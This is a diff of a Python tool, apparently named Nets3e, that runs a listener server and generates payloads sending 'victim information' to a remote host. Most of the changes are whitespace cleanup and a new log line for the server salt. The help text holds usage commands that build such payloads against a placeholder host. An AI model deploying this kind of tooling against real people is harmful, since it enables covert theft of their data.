@@ -14,22 +14,22 @@ title = '''
 <Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes,
 or you will bear corresponding legal responsibilities
 ************************************************************************************'''
-logo = f'''                                                                    
-         ,--.                                 .--,-``-.               
-       ,--.'|              ___               /   /     '.             
-   ,--,:  : |            ,--.'|_            / ../        ;            
-,`--.'`|  ' :            |  | :,'           \ ``\  .`-    '           
-|   :  :  | |            :  : ' :  .--.--.   \___\/   \   :           
-:   |   \ | :   ,---.  .;__,'  /  /  /    '       \   :   |   ,---.   
-|   : '  '; |  /     \ |  |   |  |  :  /`./       /  /   /   /     \  
-'   ' ;.    ; /    /  |:__,'| :  |  :  ;_         \  \   \  /    /  | 
-|   | | \   |.    ' / |  '  : |__ \  \    `.  ___ /   :   |.    ' / | 
-'   : |  ; .''   ;   /|  |  | '.'| `----.   \/   /\   /   :'   ;   /| 
-|   | '`--'  '   |  / |  ;  :    ;/  /`--'  / ,,/  ',-    .'   |  / | 
-'   : |      |   :    |  |  ,   /'--'.     /\ ''\        ; |   :    | 
-;   |.'       \   \  /    ---`-'   `--'---'  \   \     .'   \   \  /  
-'---'          `----'                         `--`-,,-'      `----'   
-                                                                       
+logo = f'''
+         ,--.                                 .--,-``-.
+       ,--.'|              ___               /   /     '.
+   ,--,:  : |            ,--.'|_            / ../        ;
+,`--.'`|  ' :            |  | :,'           \ ``\  .`-    '
+|   :  :  | |            :  : ' :  .--.--.   \___\/   \   :
+:   |   \ | :   ,---.  .;__,'  /  /  /    '       \   :   |   ,---.
+|   : '  '; |  /     \ |  |   |  |  :  /`./       /  /   /   /     \
+'   ' ;.    ; /    /  |:__,'| :  |  :  ;_         \  \   \  /    /  |
+|   | | \   |.    ' / |  '  : |__ \  \    `.  ___ /   :   |.    ' / |
+'   : |  ; .''   ;   /|  |  | '.'| `----.   \/   /\   /   :'   ;   /|
+|   | '`--'  '   |  / |  ;  :    ;/  /`--'  / ,,/  ',-    .'   |  / |
+'   : |      |   :    |  |  ,   /'--'.     /\ ''\        ; |   :    |
+;   |.'       \   \  /    ---`-'   `--'---'  \   \     .'   \   \  /
+'---'          `----'                         `--`-,,-'      `----'
+
                 Github==>https://github.com/MartinxMax
                 {version}'''
 
@@ -157,7 +157,7 @@ class MainServer():
             d_i = hashlib.md5(d_i + password + salt).digest()
             d += d_i
         return d[:32], d[32:48]
-    
+
     def __decrypt_with_salt(self,ciphertext, password):
         salt, ciphertext = ciphertext[:16], ciphertext[16:]
         key, iv = self.__derive_key_and_iv(password.encode(), salt)
@@ -196,6 +196,7 @@ class MainServer():
                 logger.error('PAYLOAD construction failed!!!')
         server = await asyncio.start_server(self.handleClient, '', self.lport)
         server.sockets[0].getsockname()
+        logger.info(f"Server Salt [{self.__salt}]")
         logger.info(f"Server Runing....[IP:{self.lhost}:{self.lport}]")
         async with server:
             await server.serve_forever()
@@ -216,7 +217,7 @@ if __name__ == '__main__':
                 python3 {nets3e} -rh http://www.xxx.com:9999 -g -salt <xxxx> # Transmission of victim information after
                 AES encryption to prevent Man-in-the-middle attack  (-salt) Specify the salt, default to the local IP address ({ip})
                 python3 {nets3e} -dd # DingTalk Push Message
-                python3 {nets3e} -g -echo # The generated Payload carries observable options for the victim 
+                python3 {nets3e} -g -echo # The generated Payload carries observable options for the victim
                 '''.format(nets3e=sys.argv[0],ip=myip()
                            )))
     parser.add_argument('-lh', '--LHOST',default=myip(), help='Listen_Port')
